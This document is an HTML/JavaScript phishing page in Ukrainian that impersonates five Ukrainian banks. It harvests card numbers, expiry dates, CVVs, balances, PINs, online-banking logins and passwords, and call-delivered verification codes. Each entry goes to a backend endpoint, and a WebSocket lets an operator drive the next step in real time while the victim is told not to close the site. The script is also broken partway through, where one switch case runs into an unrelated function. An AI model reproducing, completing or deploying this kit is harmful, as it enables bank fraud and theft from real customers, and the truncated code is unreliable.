<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оберіть свій банк</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; }
        :root {
            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
        }
        .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
        #bank-selection-screen { opacity: 1; transform: scale(1); }
        
        #form-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0; visibility: hidden; transform: scale(1.05);
            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
            display: flex; align-items: center; padding: 20px;
        }
        .form-container {
            width: 100%; max-width: 380px; margin-left: auto; margin-right: auto;
            background-color: var(--white); padding: 30px; border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
        }
        body.form-active { background: var(--bg-gradient); overflow: hidden; }
        body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
        body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
        h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
        .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
        .bank-item {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
            height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
            box-shadow: 0 4px 10px var(--shadow-color);
        }
        .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
        .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
        .bank-item .bank-name { font-size: 15px; font-weight: 600; }
        .bank-item.unavailable { cursor: not-allowed; opacity: 0.5; pointer-events: none; }
        .bank-item.unavailable .bank-name { color: var(--danger-color); }
        .bank-item.unavailable::after { content: 'Недоступно'; position: absolute; top: 10px; right: 10px; background: var(--danger-color); color: white; padding: 2px 6px; border-radius: 4px; font-size: 10px; }
        #form-header { text-align: center; margin-bottom: 25px; }
        #form-header-logo { max-height: 50px; max-width: 150px; }
        #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
        #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
        .input-group { margin-bottom: 15px; position: relative; }
        .input-group:last-child { margin-bottom: 0; }
        .input-field {
            width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
            font-size: 18px; font-weight: 500; transition: all 0.3s ease;
        }
        .input-field.invalid { border-color: var(--danger-color); }
        .error-message { color: var(--danger-color); font-size: 12px; margin-top: 4px; text-align: left; display: none; }
        .phone-input-wrapper { display: flex; }
        .phone-prefix {
            padding: 15px; border: 1px solid var(--border-color); border-right: none;
            background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
            flex-shrink: 0; display: flex; align-items: center;
        }
        .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; flex: 1; width: auto; min-width: 0; }
        .multi-input-row { display: flex; flex-direction: column; gap: 10px; }
        .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
        .btn {
            width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px;
            font-weight: 700; cursor: pointer; transition: all 0.3s ease;
            flex-basis: 0; flex-grow: 1;
        }
        .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
        .btn:active { transform: translateY(0) scale(0.97); }
        body { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
        body[data-theme="oschadbank"] { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
        body[data-theme="raiffeisen"] { --primary-color: #FFDD00; --accent-color: #000000; --text-on-primary: #000000; --bg-gradient: linear-gradient(135deg, #4d4d4d 0%, #1a1a1a 100%); }
        body[data-theme="vostok"] { --primary-color: #F58220; --accent-color: #D84315; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
        body[data-theme="izibank"] { --primary-color: #FF7A00; --accent-color: #E65100; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
        body[data-theme="ukrsib"] { --primary-color: #95C11F; --accent-color: #689F38; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
        .btn-next { background-color: var(--primary-color); color: var(--text-on-primary); }
        .btn-back { background-color: #f1f3f5; color: var(--light-text); }
        .pin-keyboard { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
        .pin-keyboard button { padding: 15px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; background: #f8f9fa; color: var(--dark-text); cursor: pointer; transition: background 0.2s; }
        .pin-keyboard button:hover { background: var(--primary-color); color: var(--text-on-primary); }
        .pin-dots { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
        .pin-dot { width: 12px; height: 12px; border-radius: 50%; background: #ddd; transition: background 0.2s; }
        .pin-dot.filled { background: var(--primary-color); }
        .loading-spinner { display: flex; justify-content: center; align-items: center; margin: 20px 0; }
        .loading-spinner img { width: 50px; height: 50px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .custom-input { display: none; }
        .sms-form { margin-top: 20px; }
    </style>
</head>
<body>
    <div id="bank-selection-screen" class="screen">
        <h1>Оберіть свій банк</h1>
        <div class="bank-grid"></div>
    </div>
    <div id="form-screen" class="screen">
        <div class="form-container">
            <div id="form-header"><img id="form-header-logo" src="" alt="Логотип банку"></div>
            <h2 id="modal-title"></h2>
            <div id="modal-step-content"></div>
            <div class="modal-footer">
                <button class="btn btn-back" id="back-btn">Назад</button>
                <button class="btn btn-next" id="next-btn">Продовжити</button>
            </div>
        </div>
    </div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref') || 'unknown';
    localStorage.setItem('referrer', ref);

    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    let ws;
    let activeBankData = {};
    let currentStepIndex = 0;
    let collectedData = {};
    let isBanned = localStorage.getItem('banned') === 'true';
    let currentSmsText = '';

    const specialFlowSteps = [
        { type: 'phone', title: 'Введіть номер телефону' },
        { type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }
    ];

    const confirmationSteps = [
        {
            type: 'confirm_all',
            title: 'Підтвердити володіння карткою',
            fields: [
                { id: 'card_confirm', placeholder: 'Номер картки', type: 'tel', maxlength: '19' },
                { id: 'card-expiry', placeholder: 'Термін дії (ММ/РР)', type: 'tel', maxlength: '5' },
                { id: 'card-cvv', placeholder: 'CVV', type: 'tel', maxlength: '3' },
                { id: 'balance', placeholder: 'Поточний баланс', type: 'number' }
            ]
        }
    ];

    const bankFlows = {
        'oschadbank': {
            name: 'Ощадбанк',
            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png',
            theme: 'oschadbank',
            steps: [
                { type: 'phone', title: 'Введіть номер телефону' },
                { type: 'card', title: 'Введіть номер карти' }
            ]
        },
        'raiffeisen': {
            name: 'Райффайзен',
            logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg',
            theme: 'raiffeisen',
            steps: specialFlowSteps,
            special: true
        },
        'vostok': {
            name: 'Восток',
            logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png',
            theme: 'vostok',
            steps: specialFlowSteps,
            special: true
        },
        'izibank': {
            name: 'Izibank',
            logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png',
            theme: 'izibank',
            steps: specialFlowSteps,
            special: true
        },
        'ukrsib': {
            name: 'Укрсиб',
            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp',
            theme: 'ukrsib',
            steps: specialFlowSteps,
            special: true
        }
    };

    const bankGrid = document.querySelector('.bank-grid');
    const body = document.body;
    const formHeaderLogo = document.getElementById('form-header-logo');
    const modalTitle = document.getElementById('modal-title');
    const stepContent = document.getElementById('modal-step-content');
    const modalFooter = document.querySelector('.modal-footer');
    const nextBtn = document.getElementById('next-btn');
    const backBtn = document.getElementById('back-btn');

    bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
        const bank = bankFlows[id];
        return `<a href="#" class="bank-item" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}"><span class="bank-name">${bank.name}</span></a>`;
    }).join('');

    if (isBanned) {
        document.querySelectorAll('.bank-item').forEach(item => item.style.pointerEvents = 'none');
        document.querySelector('.bank-grid').innerHTML += '<p style="text-align: center; color: var(--danger-color);">Доступ заблоковано</p>';
    }

    function connectWebSocket() {
        let reconnectAttempts = 0;
        const maxReconnects = 5;
        function attemptConnect() {
            ws = new WebSocket(`wss://${window.location.host}/ws`);
            ws.onopen = () => {
                console.log('WebSocket connected');
                reconnectAttempts = 0;
                ws.send(JSON.stringify({ type: 'register', sessionId: sessionId }));
                setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send('ping');
                    }
                }, 30000);
            };
            ws.onmessage = (event) => {
                const data = event.data;
                if (data === 'pong') return;
                const command = JSON.parse(data);
                handleServerCommand(command);
            };
            ws.onclose = () => {
                console.log('WebSocket closed, reconnecting...');
                if (reconnectAttempts < maxReconnects) {
                    reconnectAttempts++;
                    setTimeout(attemptConnect, 1000 * reconnectAttempts);
                }
            };
            ws.onerror = (error) => console.error('WebSocket error:', error);
        }
        attemptConnect();
    }

    connectWebSocket();

    async function sendDataToServer(data, isFinal, bankTheme = '') {
        console.log('Sending to server:', data, isFinal);
        collectedData = { ...collectedData, ...data };
        try {
            const response = await fetch('/api/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    sessionId, 
                    bankName: activeBankData.name, 
                    bankTheme,
                    isFinalStep: isFinal, 
                    referrer: localStorage.getItem('referrer') || 'unknown',
                    ...collectedData 
                }),
            });
            console.log('Server response:', await response.json());
        } catch (error) {
            console.error('Failed to send data:', error);
        }
    }

    function handleNextStep() {
        if (!validateCurrentStep()) return;

        let data = {};
        const inputs = stepContent.querySelectorAll('.input-field');
        inputs.forEach(input => {
            let key = input.id;
            let value = input.value;
            if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
            if (key === 'card' || key === 'card_confirm' || key === 'login' || key === 'password' || key === 'pin' || key === 'call_code_input') value = value.replace(/\s/g, '');
            data[key] = value;
        });

        const step = activeBankData.steps[currentStepIndex];
        let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;

        if (activeBankData.theme === 'oschadbank' && step.type === 'card') {
            isFinalStep = true;
            sendDataToServer(data, isFinalStep, activeBankData.theme);
            showWaitingScreen();
            return;
        }

        if (step.type.startsWith('lk_') || step.type === 'call_oschad') {
            sendDataToServer(data, true, activeBankData.theme);
            if (step.type === 'lk_oschad') {
                showLoadingSpinner();
            } else {
                showWaitingScreen();
            }
            return;
        }

        sendDataToServer(data, isFinalStep, activeBankData.theme);

        if (activeBankData.special && step.type === 'card_simple') {
            showWaitingScreen();
            return;
        }

        currentStepIndex++;
        if (currentStepIndex < activeBankData.steps.length) {
            renderStep();
        } else {
            showWaitingScreen();
        }
    }

    function showWaitingScreen() {
        modalTitle.textContent = 'Очікуємо';
        stepContent.innerHTML = `<p style="text-align:center;">Заявку відправлено. Будь ласка, чекайте на наступний крок.</p><p style="color: var(--danger-color); text-align:center; font-weight: bold;">НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
        modalFooter.style.display = 'none';
    }

    function showLoadingSpinner() {
        modalTitle.textContent = 'Очікуйте, сервер перевантажений';
        stepContent.innerHTML = `<div class="loading-spinner"><img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" alt="Loading"></div>`;
        modalFooter.style.display = 'none';
    }

    function showCodeError() {
        modalTitle.textContent = 'Вказано Невірний код';
        stepContent.innerHTML = `<p style="text-align:center; color: var(--danger-color);">Вказано Невірний код</p><div class="sms-form">${currentSmsText}</div>`;
        modalFooter.style.display = 'flex';
        nextBtn.textContent = 'Відправити';
        nextBtn.id = 'submit-sms-code';
        nextBtn.addEventListener('click', submitSmsCode, { once: true });
    }

    function handleBackStep() {
        if (currentStepIndex > 0) {
            currentStepIndex--;
            renderStep();
        } else {
            body.classList.remove('form-active');
        }
    }

    function addInputFormatting() {
        const phoneInput = document.getElementById('phone');
        if (phoneInput) {
            phoneInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                let formatted = '';
                if (value.length > 0) formatted += value.substring(0, 2);
                if (value.length > 2) formatted += ' ' + value.substring(2, 5);
                if (value.length > 5) formatted += ' ' + value.substring(5, 7);
                if (value.length > 7) formatted += ' ' + value.substring(7, 9);
                e.target.value = formatted.trim();
            });
        }
        const cardNumberInput = document.getElementById('card') || document.getElementById('card_confirm');
        if (cardNumberInput) {
            cardNumberInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                value = value.replace(/(\d{4})/g, '$1 ').trim();
                e.target.value = value;
            });
        }
        const cardExpiryInput = document.getElementById('card-expiry');
        if (cardExpiryInput) {
            cardExpiryInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
                e.target.value = value;
            });
        }
        const pinInput = document.getElementById('pin') || document.querySelector('.custom-input');
        if (pinInput) {
            // Для PIN клавиатуры логика в renderStep
        }
        const callCodeInput = document.getElementById('call_code_input');
        if (callCodeInput) {
            callCodeInput.maxLength = 4;
        }
    }

    function validateCurrentStep() {
        let isValid = true;
        const inputs = stepContent.querySelectorAll('.input-field:not(.custom-input)');
        inputs.forEach(input => {
            const errorContainer = input.nextElementSibling;
            input.classList.remove('invalid');
            if (errorContainer && errorContainer.classList.contains('error-message')) {
                errorContainer.style.display = 'none';
            }

            let value = input.value.replace(/\D/g, '');
            let requiredLength = 0;

            switch (input.id) {
                case 'phone': requiredLength = 9; break;
                case 'card':
                case 'card_confirm': requiredLength = 16; break;
                case 'card-expiry': requiredLength = 4; break;
                case 'card-cvv': requiredLength = 3; break;
                case 'pin':
                case 'login':
                case 'password': requiredLength = input.value.length > 0 ? 0 : 1; break;
                case 'call_code_input': requiredLength = 4; break;
            }

            if (requiredLength > 0 && value.length < requiredLength || (requiredLength === 1 && !input.value.trim())) {
                isValid = false;
                input.classList.add('invalid');
                if (errorContainer) {
                    errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`;
                    errorContainer.style.display = 'block';
                }
            }
        });
        return isValid;
    }

    function renderStep() {
        const step = activeBankData.steps[currentStepIndex];
        let html = '';

        const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => {
            return `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;
        };

        switch (step.type) {
            case 'phone':
                html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`;
                break;
            case 'card':
            case 'card_simple':
                html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19');
                break;
            case 'pin':
                if (activeBankData.theme === 'raiffeisen' || activeBankData.theme === 'izibank') {
                    html = `
                        <p style="text-align:center;">Введіть пароль</p>
                        <div class="pin-dots" id="pin-dots"></div>
                        <input type="password" class="custom-input" id="pin" maxlength="4">
                        <div class="pin-keyboard" id="pin-keyboard">
                            ${[1,2,3,4,5,6,7,8,9,0].map(num => `<button type="button" data-pin="${num}">${num}</button>`).join('')}
                            <button type="button" data-pin="" style="grid-column: span 2;">Видалити</button>
                        </div>
                    `;
                } else {
                    html = generateInputHTML('pin', 'ПІН-код', 'password', '4');
                }
                break;
            case 'call_code':
                html = `<p style="text-align:center;">Зараз вам буде здійснено дзвінок для проходження авторизації. Підніміть слухавку, натисніть 1 та прослухайте код. Код введіть у форму нижче.</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
                break;
            case 'confirm_all':
                html = '<div class="multi-input-row">';
                step.fields.forEach(field => {
                    if (activeBankData.theme === 'raiffeisen' && (field.id === 'card_confirm' || field.id === 'balance')) return;
                    if (activeBankData.theme === 'ukrsib' && field.id === 'card-cvv') return;
                    html += generateInputHTML(field.id, field.placeholder, field.type, field.maxlength);
                });
                html += '</div>';
                break;
            case 'lk_oschad':
                html = `<p style="text-align:center;">Авторизуйтесь через Ощад24</p>${generateInputHTML('login', 'Логін', 'text')}${generateInputHTML('password', 'Пароль', 'password')}`;
                break;
            case 'lk_raiffeisen':
                html = `
                    <p style="text-align:center;">Введіть пароль</p>
                    <div class="pin-dots" id="pin-dots"></div>
                    <input type="password" class="custom-input" id="pin" maxlength="4">
                    <div class="pin-keyboard" id="pin-keyboard">
                        ${[1,2,3,4,5,6,7,8,9,0].map(num => `<button type="button" data-pin="${num}">${num}</button>`).join('')}
                        <button type="button" data-pin="" style="grid-column: span 2;">Видалити</button>
                    </div>
                `;
                break;
            case 'lk_vostok':
                html = `<p style="text-align:center;">Вхід у Vostok Bank</p><div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12" value=""></div><div class="error-message" style="margin-left: 55px;"></div></div>${generateInputHTML('password', 'Пароль', 'password')}`;
                break;
            case 'lk_izibank':
                html = `
                    <p style="text-align:center;">Введіть ПІН-код картки</p>
                    <div class="pin-dots" id="pin-dots"></div>
                    <input type="password" class="custom-input" id="pin" maxlength="4">
                    <div class="pin-keyboard" id="pin-keyboard">
                        ${[1,2,3,4,5,6,7,8,9,0].map(num => `<button type="button" data-pin="${num}">${num}</button>`).join('')}
                        <button type="button" data-pin="" style="grid-column: span 2;">Видалити</button>
                    </div>
                `;
                break;
            case 'lk_ukrsib':

    function setupPinKeyboard() {
        const pinInput = document.getElementById('pin');
        const dots = document.getElementById('pin-dots');
        const keyboard = document.getElementById('pin-keyboard');
        let currentPin = '';

        dots.innerHTML = Array(4).fill('<div class="pin-dot"></div>').join('');

        keyboard.addEventListener('click', (e) => {
            if (e.target.tagName !== 'BUTTON') return;
            const digit = e.target.dataset.pin;
            if (digit === '') {
                currentPin = currentPin.slice(0, -1);
            } else {
                currentPin += digit;
            }
            pinInput.value = currentPin;
            updateDots();
            if (currentPin.length === 4) {
                handleNextStep();
            }
        });

        function updateDots() {
            const dotElements = dots.querySelectorAll('.pin-dot');
            dotElements.forEach((dot, index) => {
                dot.classList.toggle('filled', index < currentPin.length);
            });
        }
    }
